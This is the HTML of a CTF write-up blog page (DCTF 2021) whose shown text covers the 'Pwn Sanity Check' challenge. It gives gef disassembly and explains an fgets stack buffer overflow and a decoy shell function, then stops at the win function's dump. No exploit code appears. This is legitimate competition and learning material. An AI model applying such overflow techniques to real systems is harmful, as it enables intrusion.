






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>DCTF - 2021 &middot; Pwnverse</title>
    <meta name="title" content="DCTF - 2021 &middot; Pwnverse" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.c88b17cd03f499150afb912b303951e47a47a51fe2966b89af02adec35bf5737.css"
    integrity="sha256-yIsXzQP0mRUK&#43;5ErMDlR5HpHpR/ilmuJrwKt7DW/Vzc="
  />
  
    
    
    
  
  
  
    
    
  
  
    
    
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.0ce71464304b0e7f6f5dc04656b9ff39cbcb7ff30af0a0e1268c1c3147e8ddd8.js"
      integrity="sha256-DOcUZDBLDn9vXcBGVrn/OcvLf/MK8KDhJowcMUfo3dg="
      data-copy="Copy"
      data-copied="Copied"
    ></script>
  
  
  <meta
    name="description"
    content="
      
        I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.
      
    "
  />
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/ductf/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/ductf/">
  <meta property="og:site_name" content="Pwnverse">
  <meta property="og:title" content="DCTF - 2021">
  <meta property="og:description" content="I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-05-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-05-07T00:00:00+00:00">
    <meta property="article:tag" content="Pwn, Ctf, __Malloc_hook, Rop, Pwntools">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="DCTF - 2021">
<meta name="twitter:description" content="I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "DCTF - 2021",
    "headline": "DCTF - 2021",
    
    "abstract": "I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on.",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/ductf\/",
    "author" : {
      "@type": "Person",
      "name": "D4mianWayne"
    },
    "copyrightYear": "2021",
    "dateCreated": "2021-05-07T00:00:00\u002b00:00",
    "datePublished": "2021-05-07T00:00:00\u002b00:00",
    
    "dateModified": "2021-05-07T00:00:00\u002b00:00",
    
    "keywords": ["pwn, ctf, __malloc_hook, rop, pwntools"],
    
    "mainEntityOfPage": "true",
    "wordCount": "4898"
  }
  </script>


  
  <meta name="author" content="D4mianWayne" />
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="z-40 flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Pwnverse</a
  >

    </div>
    
      
      <label id="menu-button" for="menu-controller" class="block sm:hidden">
        <input type="checkbox" id="menu-controller" class="hidden" />
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
        >
          <ul
            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
          >
            <li class="mb-1">
              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span></span
              >
            </li>
            
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/posts/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Blog</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/categories/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Categories</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/about/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >About</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/tags/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Tags</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="https://github.com/D4mianWayne"
                      title=""
                      onclick="close_menu()"
                      target="_blank"
                      >
                        <span
                          class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                        ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    
                    
                      <button
                        id="search-button-1"
                        title="Search (/)"
                      >
                        
                          <span
                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                            ></span
                          >
                        
                      </button>
                    
                  
                </li>
              
                
                  
              
            
          </ul>
        </div>
      </label>
      
      <ul class="hidden list-none flex-row text-end sm:flex">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/posts/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/about/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >About</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="https://github.com/D4mianWayne"
                  title=""
                  target="_blank"
                  >
                    <span
                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                
                
                  <button
                    id="search-button-2"
                    title="Search (/)"
                  >
                    
                      <span
                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                        ></span
                      >
                    
                  </button>
                
              
            </li>
          
            
              
          

        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article class="max-w-full">
    <header>
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/"
      >Pwnverse</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class=" inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/ductf/"
      >DCTF - 2021</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        DCTF - 2021
      </h1>
    </header>
    <section class="prose mt-6 max-w-full dark:prose-invert">
      <p>I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on. In the end, I manage to solve 7/8 pwn challenges and remaining one was solved by Faith, super talented guy.</p>
<!-- more -->
<h3 id="pwn-sanity-check" class="relative group">Pwn Sanity Check <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pwn-sanity-check" aria-label="Anchor">#</a></span></h3><p>This was more of a sanity check challenge for the pwn challenges, this was ridiculously easy:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078c</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078d</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400790</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400795</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040079a</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400580</span> <span class="p">&lt;</span><span class="no">alarm@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040079f</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007a4</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400730</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007a9</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007ae</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000004007af</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400730</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400731</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400734</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x40</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400738</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1d1</span><span class="p">]</span>        <span class="c1"># 0x400910
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040073f</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400744</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200915</span><span class="p">]</span>        <span class="c1"># 0x601060 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040074b</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040074f</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400754</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400757</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400590</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040075c</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0xdeadc0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400763</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x40077d</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">77</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400765</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1b4</span><span class="p">]</span>        <span class="c1"># 0x400920
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000040076c</span> <span class="err">&lt;+</span><span class="mi">60</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400771</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400776</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4006f4</span> <span class="p">&lt;</span><span class="no">shell</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040077b</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x400789</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">89</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040077d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x1c1</span><span class="p">]</span>        <span class="c1"># 0x400945
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000400784</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400789</span> <span class="err">&lt;+</span><span class="mi">89</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040078a</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000040078b</span> <span class="err">&lt;+</span><span class="mi">91</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span></code></pre></div><p>First off the main function calls the vuln function which takes the input from the fgets, there was a buffer overflow vulnerability in the fgets call since the buffer was of size 0x40, while the size fgets takes is 0x100 making it vulnerable to stack overflow. In the vuln function it checks if the rbp - 0x4 has the value 0xdeadc0de which calls the shell function it the value turns out to be same but the shell function wasn’t spawning shell, it turns out to be troll function. Next up, there was a win function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">win</span><span class="p">:</span>
